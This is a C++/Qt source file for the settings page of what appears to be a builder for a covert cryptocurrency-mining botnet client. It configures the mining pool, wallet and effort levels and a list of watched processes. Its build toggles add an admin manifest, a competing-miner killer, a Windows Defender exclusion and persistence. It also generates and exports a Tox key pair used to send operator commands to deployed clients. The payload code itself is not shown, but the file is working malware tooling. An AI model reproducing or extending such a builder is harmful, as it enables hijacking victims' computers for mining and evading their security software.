#include "pages/settingspage.h"
#include "ui_settingspage.h"

#include "appsettings.h"
#include "buildsystem.h"
#include "theme.h"
#include "widgets/fieldrow.h"
#include "widgets/toggleswitch.h"
#include <QValidator>
#include <QDir>
#include <QFile>
#include <QFileDialog>
#include <QRandomGenerator>
#include <QStandardPaths>
#include <QThread>

#include <QApplication>
#include <QButtonGroup>
#include <QMessageBox>
#include <QTimer>

SettingsPage::SettingsPage(QWidget *parent)
    : QWidget(parent)
    , ui(new Ui::SettingsPage)
    , m_buildSystem(new BuildSystem(this))
{
    ui->setupUi(this);
    applyTheme();
    connectWidgets();
    reloadFromSettings();
}

SettingsPage::~SettingsPage()
{
    delete ui;
}

/*
 * Only what a form cannot express. Every label on this page is styled by its
 * `role` property in settingspage.ui — add a label in Designer, give it a
 * role there, and there is nothing to do here.
 *
 * saveNote is the exception: it switches between Faint and Ok while running
 * (see save()), so it is driven from C++ and deliberately has no role.
 */
void SettingsPage::applyTheme()
{
    Theme::applyText(ui->saveNote, Theme::TextRole::Faint);

    // Accent swatches: each button is painted in the colour it stands for, so
    // the colour cannot come from the shared stylesheet.
    const struct { QPushButton *button; QColor colour; } swatches[3] = {
                      { ui->accentPink,   Theme::Pink },
                      { ui->accentPurple, Theme::Purple },
                      { ui->accentTeal,   Theme::Teal },
                      };
    for (const auto &s : swatches) {
        s.button->setCursor(Qt::PointingHandCursor);
        s.button->setStyleSheet(QStringLiteral(
                                    "QPushButton{background:%1;border:2px solid transparent;border-radius:%3px;}"
                                    "QPushButton:checked{border:2px solid %2;}")
                                    .arg(s.colour.name(), Theme::Text.name())
                                    .arg(Theme::Metric::Radius));
    }
    ui->walletField->setMonospace(true);
    ui->toxField->setMonospace(true);
    ui->toxPairValue->setFont(Theme::monoFont(8));
}

void SettingsPage::connectWidgets()
{
    // --- the six saved text fields -----------------------------------------
    ValidatedField *fields[] = { ui->endpointField, ui->poolField, ui->walletField,
                                ui->toxField, ui->configUrlField, ui->passwordField,
                                ui->watchedField };
    for (ValidatedField *f : fields)
        connect(f, &ValidatedField::edited, this, &SettingsPage::updateSaveState);

    connect(ui->saveButton,   &QPushButton::clicked, this, &SettingsPage::save);
    connect(ui->revertButton, &QPushButton::clicked, this, &SettingsPage::reloadFromSettings);

    // --- mining -------------------------------------------------------------
    connect(ui->idleSwitch, &ToggleSwitch::toggled, this, [this](bool on) {
        if (!m_loading)
            markTogglesDirty();
        ui->idleAfterSpin->setEnabled(on);
        ui->idleEffortSpin->setEnabled(on);
        updateMiningWarning();
    });
    connect(ui->activeSwitch, &ToggleSwitch::toggled, this, [this](bool on) {
        if (!m_loading)
            markTogglesDirty();
        ui->activeEffortSpin->setEnabled(on);
        updateMiningWarning();
    });
    connect(ui->tlsSwitch, &ToggleSwitch::toggled, this, [this](bool) {
        if (!m_loading)
            markTogglesDirty();
    });
    connect(ui->cpuSwitch, &ToggleSwitch::toggled, this, [this](bool) {
        if (!m_loading)
            markTogglesDirty();
    });
    connect(ui->gpuSwitch, &ToggleSwitch::toggled, this, [this](bool) {
        if (!m_loading)
            markTogglesDirty();
    });
    // Remote-miner toggle removed — miners are always embedded now. The UI row is
    // gone from the .ui file; nothing remains to wire up here.
    connect(ui->idleAfterSpin, QOverload<int>::of(&QSpinBox::valueChanged), this, [this](int) {
        if (!m_loading)
            markTogglesDirty();
    });
    connect(ui->idleEffortSpin, QOverload<int>::of(&QSpinBox::valueChanged), this, [this](int) {
        if (!m_loading)
            markTogglesDirty();
    });
    connect(ui->activeEffortSpin, QOverload<int>::of(&QSpinBox::valueChanged), this, [this](int) {
        if (!m_loading)
            markTogglesDirty();
    });

    // --- build features (priority order) ------------------------------------
    // PRIORITY 1: Admin Manifest (featureSwitch1). P2 and P3 depend on it.
    connect(ui->featureSwitch1, &ToggleSwitch::toggled, this, [this](bool on) {
        if (m_loading)
            return;
        if (!on) {
            // The two features below need admin, so turning the manifest off
            // forces them off too.
            m_loading = true;
            ui->featureSwitch2->setChecked(false);
            ui->featureSwitch3->setChecked(false);
            m_loading = false;
        }
        markTogglesDirty();
    });

    // PRIORITY 2: Foreign Miner Killer (featureSwitch2) — requires P1 (admin).
    connect(ui->featureSwitch2, &ToggleSwitch::toggled, this, [this](bool on) {
        if (m_loading)
            return;
        if (on && !ui->featureSwitch1->isChecked()) {
            m_loading = true;
            ui->featureSwitch1->setChecked(true);
            m_loading = false;
        }
        markTogglesDirty();
    });

    // PRIORITY 3: Defender Exclusion (featureSwitch3) — requires P1 (admin).
    connect(ui->featureSwitch3, &ToggleSwitch::toggled, this, [this](bool on) {
        if (m_loading)
            return;
        if (on && !ui->featureSwitch1->isChecked()) {
            m_loading = true;
            ui->featureSwitch1->setChecked(true);
            m_loading = false;
        }
        markTogglesDirty();
    });

    // PRIORITY 4: Debug Console (featureSwitch5)
    connect(ui->featureSwitch5, &ToggleSwitch::toggled, this, [this](bool) {
        if (!m_loading)
            markTogglesDirty();
    });

    // PRIORITY 5: Persistence (featureSwitch6)
    connect(ui->featureSwitch6, &ToggleSwitch::toggled, this, [this](bool) {
        if (!m_loading)
            markTogglesDirty();
    });

    // --- appearance ---------------------------------------------------------
    auto *accentGroup = new QButtonGroup(this);
    accentGroup->setExclusive(true);
    const struct { QPushButton *button; const char *name; } accents[3] = {
                     { ui->accentPink,   "pink" },
                     { ui->accentPurple, "purple" },
                     { ui->accentTeal,   "teal" },
                     };
    for (const auto &a : accents) {
        accentGroup->addButton(a.button);
        const QString name = QString::fromLatin1(a.name);
        a.button->setAccessibleName(tr("%1 accent").arg(name));
        a.button->setToolTip(tr("Use %1 accent").arg(name));
        connect(a.button, &QPushButton::clicked, this, [name] {
            Theme::setAccent(name);
            AppSettings::i()->set(Keys::UiAccent, name);
            qApp->setPalette(Theme::palette());
            qApp->setStyleSheet(Theme::styleSheet());
        });
    }

    connect(ui->animationsSwitch, &ToggleSwitch::toggled, this, [this](bool on) {
        if (!m_loading) AppSettings::i()->set(Keys::UiAnimations, on);
    });
    connect(ui->traySwitch, &ToggleSwitch::toggled, this, [this](bool on) {
        if (!m_loading) AppSettings::i()->set(Keys::UiTray, on);
    });

    // --- pet ----------------------------------------------------------------
    const struct { QCheckBox *box; const QString *key; } petBoxes[4] = {
                      { ui->petEnabledBox, &Keys::PetEnabled },
                      { ui->petChatterBox, &Keys::PetChatter },
                      { ui->petFollowBox,  &Keys::PetFollow },
                      { ui->petOnTopBox,   &Keys::PetOnTop },
                      };
    for (const auto &p : petBoxes) {
        const QString key = *p.key;
        connect(p.box, &QCheckBox::toggled, this, [this, key](bool on) {
            if (!m_loading)
                AppSettings::i()->set(key, on);
        });
    }

    connect(ui->petScaleSlider, &QSlider::valueChanged, this, [this](int v) {
        ui->petScaleValue->setText(QStringLiteral("%1%").arg(v));
        if (!m_loading) AppSettings::i()->set(Keys::PetScale, v);
    });
    connect(ui->petSpeedSlider, &QSlider::valueChanged, this, [this](int v) {
        ui->petSpeedValue->setText(QStringLiteral("%1×").arg(v / 100.0, 0, 'f', 1));
        if (!m_loading) AppSettings::i()->set(Keys::PetSpeed, v / 100.0);
    });

    // --- reset --------------------------------------------------------------
    connect(ui->generateToxPairButton, &QPushButton::clicked, this, &SettingsPage::generateToxPair);
    connect(ui->exportToxPairButton, &QPushButton::clicked, this, &SettingsPage::exportToxPair);

    connect(ui->resetButton, &QPushButton::clicked, this, [this] {
        const auto answer = QMessageBox::warning(
            this, tr("Reset settings"),
            tr("Restore every setting to its default?\n\n"
               "This will permanently delete:\n"
               "  • The Tox operator private key (unrecoverable)\n"
               "  • The bot identity and savedata\n"
               "  • The endpoint, pool, wallet and all build options\n\n"
               "Every deployed client built with the current Tox pair will be "
               "permanently orphaned and will no longer accept operator commands.\n\n"
               "This cannot be undone."),
            QMessageBox::Cancel | QMessageBox::Reset, QMessageBox::Cancel);
        if (answer != QMessageBox::Reset)
            return;
        AppSettings::i()->resetToDefaults();
        Theme::setAccent(AppSettings::i()->getString(Keys::UiAccent));
        qApp->setPalette(Theme::palette());
        qApp->setStyleSheet(Theme::styleSheet());
        reloadFromSettings();
    });

    // the pet's own context menu can change these behind our back
    connect(AppSettings::i(), &AppSettings::changed, this,
            [this](const QString &key, const QVariant &value) {
                // The endpoint field is required only in Endpoint update
                // mode, which is picked on the Build page — resync when it
                // changes out from under us.
                if (key == Keys::ConfigUpdateMode) {
                    if (!m_loading)
                        syncEndpointOptional();
                    return;
                }
                if (m_loading)
                    return;
                QCheckBox *target = key == Keys::PetFollow  ? ui->petFollowBox
                                    : key == Keys::PetEnabled ? ui->petEnabledBox
                                                              : nullptr;
                if (!target || target->isChecked() == value.toBool())
                    return;
                m_loading = true;
                target->setChecked(value.toBool());
                m_loading = false;
            });
}

void SettingsPage::reloadFromSettings()
{
    m_loading = true;
    m_togglesDirty = false;
    AppSettings *s = AppSettings::i();

    // --- endpoint and addresses --------------------------------------------
    ui->endpointField->setText(s->getString(Keys::NetEndpoint));
    ui->poolField->setText(s->getString(Keys::MinerPool));
    ui->walletField->setText(s->getString(Keys::MinerWallet));
    ui->toxField->setText(s->operatorToxId());
    {
        // Read-only echo of the pair generated on the Control page, so the
        // operator can see/copy the identities here too.
        const QString opId = s->getString(Keys::ToxOperatorId);
        const QString botId = s->getString(Keys::ToxBotId);
        if (opId.isEmpty() || botId.isEmpty())
            ui->toxPairValue->setText(tr("No generated Tox pair yet — use the Control page to generate one."));
        else
            ui->toxPairValue->setText(tr("Generated pair · operator: %1 · bot: %2").arg(opId, botId));
    }
    ui->configUrlField->setText(s->getString(Keys::BuildConfigUrl));
    ui->passwordField->setText(s->getString(Keys::MinerPassword));
    ui->watchedField->setText(s->getString(Keys::BuildWatchedProcesses));

    // --- mining ------------------------------------------------------------
    ui->idleSwitch->setChecked(s->getBool(Keys::MinerOnIdle));
    ui->activeSwitch->setChecked(s->getBool(Keys::MinerOnActive));
    ui->tlsSwitch->setChecked(s->getBool(Keys::MinerTls));
    ui->cpuSwitch->setChecked(s->getBool(Keys::BuildCpuEnabled));
    ui->gpuSwitch->setChecked(false);
    // GPU mining is not supported in this release (may return in a later
    // update). Hide the whole row — note the labels are gpuTitle/gpuSubtitle,
    // there is no "gpuLabel", so hiding only the switch leaves dead text.
    ui->gpuSwitch->setVisible(false);
    if (auto *t = findChild<QLabel*>("gpuTitle")) t->setVisible(false);
    if (auto *st = findChild<QLabel*>("gpuSubtitle")) st->setVisible(false);
    ui->idleAfterSpin->setValue(s->getInt(Keys::MinerIdleAfter));
    ui->idleAfterSpin->setEnabled(ui->idleSwitch->isChecked());
    ui->idleEffortSpin->setValue(s->getInt(Keys::MinerIdleEffort));
    ui->idleEffortSpin->setEnabled(ui->idleSwitch->isChecked());
    ui->activeEffortSpin->setValue(s->getInt(Keys::MinerActiveEffort));
    ui->activeEffortSpin->setEnabled(ui->activeSwitch->isChecked());

    // --- build features (priority order) ------------------------------------
    ui->featureSwitch1->setChecked(s->getBool(Keys::BuildAdminManifest));        // PRIORITY 1
    ui->featureSwitch2->setChecked(s->getBool(Keys::BuildForeignMinerKiller));   // PRIORITY 2
    ui->featureSwitch3->setChecked(s->getBool(Keys::BuildDefenderExclusion));    // PRIORITY 3
    ui->featureSwitch5->setChecked(s->getBool(Keys::BuildDebugConsole));         // PRIORITY 4
    ui->featureSwitch6->setChecked(s->getBool(Keys::BuildPersistence));          // PRIORITY 5

    // --- appearance ---------------------------------------------------------
    ui->animationsSwitch->setChecked(s->getBool(Keys::UiAnimations));
    ui->traySwitch->setChecked(s->getBool(Keys::UiTray));

    const QString accent = s->getString(Keys::UiAccent);
    ui->accentPink->setChecked(accent == QLatin1String("pink"));
    ui->accentPurple->setChecked(accent == QLatin1String("purple"));
    ui->accentTeal->setChecked(accent == QLatin1String("teal"));

    // --- pet ----------------------------------------------------------------
    ui->petEnabledBox->setChecked(s->getBool(Keys::PetEnabled));
    ui->petChatterBox->setChecked(s->getBool(Keys::PetChatter));
    ui->petFollowBox->setChecked(s->getBool(Keys::PetFollow));
    ui->petOnTopBox->setChecked(s->getBool(Keys::PetOnTop));
    ui->petScaleSlider->setValue(s->getInt(Keys::PetScale));
    ui->petSpeedSlider->setValue(qRound(s->getDouble(Keys::PetSpeed) * 100.0));
    ui->petScaleValue->setText(QStringLiteral("%1%").arg(ui->petScaleSlider->value()));
    ui->petSpeedValue->setText(QStringLiteral("%1×")
                                   .arg(ui->petSpeedSlider->value() / 100.0, 0, 'f', 1));

    m_loading = false;
    syncEndpointOptional();
    updateMiningWarning();
    updateSaveState();
    ui->saveNote->clear();
}

void SettingsPage::syncEndpointOptional()
{
    const QString mode = AppSettings::i()->getString(Keys::ConfigUpdateMode);
    const QString effective = mode.isEmpty() ? QStringLiteral("tox") : mode;
    ui->endpointField->setOptional(effective != QStringLiteral("endpoint"));
    updateSaveState();
}

void SettingsPage::updateMiningWarning()
{
    const bool idle   = ui->idleSwitch->isChecked();
    const bool active = ui->activeSwitch->isChecked();
    ui->miningWarning->setText(!idle && !active
                                   ? tr("Both mining switches are off. Nothing would run.")
                                   : QString());
}

void SettingsPage::markTogglesDirty()
{
    m_togglesDirty = true;
    updateSaveState();
}

bool SettingsPage::isDirty() const
{
    AppSettings *s = AppSettings::i();
    auto normTox = [](const QString &t){ return Validators::normalizeHex(t); };
    return ui->endpointField->text().trimmed() != s->getString(Keys::NetEndpoint).trimmed()
           || ui->poolField->text().trimmed()     != s->getString(Keys::MinerPool).trimmed()
           || ui->walletField->text().trimmed()   != s->getString(Keys::MinerWallet).trimmed()
           || normTox(ui->toxField->text())       != normTox(s->operatorToxId())
           || ui->configUrlField->text().trimmed() != s->getString(Keys::BuildConfigUrl).trimmed()
           || ui->passwordField->text()           != s->getString(Keys::MinerPassword)
           || ui->watchedField->text().trimmed()  != s->getString(Keys::BuildWatchedProcesses).trimmed()
           || ui->idleSwitch->isChecked()         != s->getBool(Keys::MinerOnIdle)
           || ui->activeSwitch->isChecked()       != s->getBool(Keys::MinerOnActive)
           || ui->tlsSwitch->isChecked()          != s->getBool(Keys::MinerTls)
           || ui->cpuSwitch->isChecked()          != s->getBool(Keys::BuildCpuEnabled)
           || ui->idleAfterSpin->value()          != s->getInt(Keys::MinerIdleAfter)
           || ui->idleEffortSpin->value()         != s->getInt(Keys::MinerIdleEffort)
           || ui->activeEffortSpin->value()       != s->getInt(Keys::MinerActiveEffort)
           || ui->featureSwitch1->isChecked()     != s->getBool(Keys::BuildAdminManifest)
           || ui->featureSwitch2->isChecked()     != s->getBool(Keys::BuildForeignMinerKiller)
           || ui->featureSwitch3->isChecked()     != s->getBool(Keys::BuildDefenderExclusion)
           || ui->featureSwitch5->isChecked()     != s->getBool(Keys::BuildDebugConsole)
           || ui->featureSwitch6->isChecked()     != s->getBool(Keys::BuildPersistence);
}

void SettingsPage::onPageShown()
{
    if (!isDirty())
        reloadFromSettings();
    // If dirty: leave the user's in-progress edits intact — they navigated
    // away and came back. The "Unsaved changes." note is already visible.
}

void SettingsPage::onPageHidden()
{
    if (isDirty())
        emit unsavedChangesOnLeave();
}

void SettingsPage::updateSaveState()
{
    const bool allOk = ui->endpointField->isAcceptable() && ui->poolField->isAcceptable()
    && ui->walletField->isAcceptable()   && ui->toxField->isAcceptable()
        && ui->configUrlField->isAcceptable() && ui->passwordField->isAcceptable()
        && ui->watchedField->isAcceptable();

    const bool dirty = isDirty();

    ui->saveButton->setEnabled(allOk && dirty);
    ui->revertButton->setEnabled(dirty);

    if (!allOk)
        ui->saveNote->setText(tr("Fix the fields marked in red."));
    else if (dirty)
        ui->saveNote->setText(tr("Unsaved changes."));
    else
        ui->saveNote->clear();
}

void SettingsPage::save()
{
    AppSettings *s = AppSettings::i();

    // --- endpoint and addresses --------------------------------------------
    s->set(Keys::NetEndpoint,   ui->endpointField->text());
    s->set(Keys::MinerPool,     ui->poolField->text());
    s->set(Keys::MinerWallet,   ui->walletField->text());
    s->set(Keys::IdTox,         Validators::normalizeHex(ui->toxField->text()));
    s->set(Keys::BuildConfigUrl, ui->configUrlField->text().trimmed());
    s->set(Keys::MinerPassword, ui->passwordField->text());
    s->set(Keys::BuildWatchedProcesses, ui->watchedField->text().trimmed());

    // --- mining toggles (save-gated) ----------------------------------------
    s->set(Keys::MinerOnIdle,       ui->idleSwitch->isChecked());
    s->set(Keys::MinerOnActive,     ui->activeSwitch->isChecked());
    s->set(Keys::MinerTls,          ui->tlsSwitch->isChecked());
    s->set(Keys::BuildCpuEnabled,   ui->cpuSwitch->isChecked());
    s->set(Keys::BuildGpuEnabled,   ui->gpuSwitch->isChecked());
    s->set(Keys::MinerIdleAfter,    ui->idleAfterSpin->value());
    s->set(Keys::MinerIdleEffort,   ui->idleEffortSpin->value());
    s->set(Keys::MinerActiveEffort, ui->activeEffortSpin->value());

    // --- build features (priority order) -------------------------------------
    s->set(Keys::BuildAdminManifest,      ui->featureSwitch1->isChecked());   // PRIORITY 1
    s->set(Keys::BuildForeignMinerKiller, ui->featureSwitch2->isChecked());   // PRIORITY 2
    s->set(Keys::BuildDefenderExclusion,  ui->featureSwitch3->isChecked());   // PRIORITY 3
    s->set(Keys::BuildDebugConsole,       ui->featureSwitch5->isChecked());   // PRIORITY 4
    s->set(Keys::BuildPersistence,        ui->featureSwitch6->isChecked());   // PRIORITY 5
    m_togglesDirty = false;

    // write back the normalised Tox ID so the field shows what was stored
    m_loading = true;
    ui->toxField->setText(s->operatorToxId());
    m_loading = false;

    updateSaveState();
    ui->saveNote->setText(tr("Saved."));
    Theme::applyText(ui->saveNote, Theme::TextRole::Ok);
    QTimer::singleShot(2200, this, [this] {
        Theme::applyText(ui->saveNote, Theme::TextRole::Faint);
        updateSaveState();
    });
}

void SettingsPage::generateToxPair()
{
    const bool havePair = !AppSettings::i()->getString(Keys::ToxOperatorId).isEmpty();
    if (havePair) {
        auto ans = QMessageBox::warning(this, tr("Replace existing Tox pair?"),
            tr("A Tox pair is already stored.\n\nGenerating a new one will permanently orphan every deployed client that was built with the current pair.\n\nContinue only if you intend to rebuild and redeploy all clients."),
            QMessageBox::Cancel | QMessageBox::Yes, QMessageBox::Cancel);
        if (ans != QMessageBox::Yes) return;
    }
    const QString name = QStringLiteral("bot-%1").arg(int(QRandomGenerator::global()->generate() & 0xFFFF), 4, 16, QLatin1Char('0'));
    ui->generateToxPairButton->setEnabled(false);
    ui->toxPairNote->setText(tr("Generating Tox pair…"));
    Theme::applyText(ui->toxPairNote, Theme::TextRole::Faint);
    QThread *t = QThread::create([this, name]{
        QString opId, opSave, botId, botSave; QStringList log;
        bool ok = m_buildSystem->generateToxPair(opId, opSave, botId, botSave, name, [&log](const QString &l){ if(!l.trimmed().isEmpty()) log<<l; });
        QMetaObject::invokeMethod(this, [this, ok, opId, opSave, botId, botSave, name, log]{
            ui->generateToxPairButton->setEnabled(true);
            if (ok) {
                AppSettings *s = AppSettings::i();
                s->set(Keys::ToxOperatorId, opId);
                s->set(Keys::ToxOperatorSavedata, opSave);
                s->set(Keys::ToxBotId, botId);
                s->set(Keys::ToxBotSavedata, botSave);
                s->set(Keys::ToxBotName, name);
                // Do NOT overwrite manual IdTox — operatorToxId() will fallback to ToxOperatorId
                reloadFromSettings();
                ui->toxPairNote->setText(tr("Tox pair generated — operator %1").arg(opId.left(8)));
                Theme::applyText(ui->toxPairNote, Theme::TextRole::Ok);
            } else {
                QString detail; for (auto &l: log) if (l.contains("[!]")||l.contains("Error",Qt::CaseInsensitive)) detail=l;
                if (detail.isEmpty() && !log.isEmpty()) detail=log.last();
                ui->toxPairNote->setText(detail.isEmpty()?tr("Failed to generate Tox pair."):detail);
                Theme::applyText(ui->toxPairNote, Theme::TextRole::Error);
            }
        }, Qt::QueuedConnection);
    });
    connect(t,&QThread::finished,t,&QThread::deleteLater); t->start();
}

void SettingsPage::exportToxPair()
{
    const QString hex = AppSettings::i()->getString(Keys::ToxOperatorSavedata);
    if (hex.isEmpty()) { ui->toxPairNote->setText(tr("No operator savedata to export.")); Theme::applyText(ui->toxPairNote, Theme::TextRole::Error); return; }
    auto ans = QMessageBox::warning(this, tr("Export operator identity"),
        tr("The savedata contains your private Tox key.\n\nAnyone with this file can impersonate you as operator.\n\nDo not save to cloud-synced folders."),
        QMessageBox::Cancel | QMessageBox::Ok, QMessageBox::Cancel);
    if (ans != QMessageBox::Ok) return;
    QString path = QFileDialog::getSaveFileName(this, tr("Export operator savedata"),
        QDir(QStandardPaths::writableLocation(QStandardPaths::DocumentsLocation)).filePath("tox_operator.tox"), tr("Tox profile (*.tox)"));
    if (path.isEmpty()) return;
    QFile f(path); if (f.open(QIODevice::WriteOnly)) { f.write(QByteArray::fromHex(hex.toLatin1())); f.close(); ui->toxPairNote->setText(tr("Exported to %1").arg(path)); Theme::applyText(ui->toxPairNote, Theme::TextRole::Ok); }
    else { ui->toxPairNote->setText(tr("Could not write %1").arg(path)); Theme::applyText(ui->toxPairNote, Theme::TextRole::Error); }
}
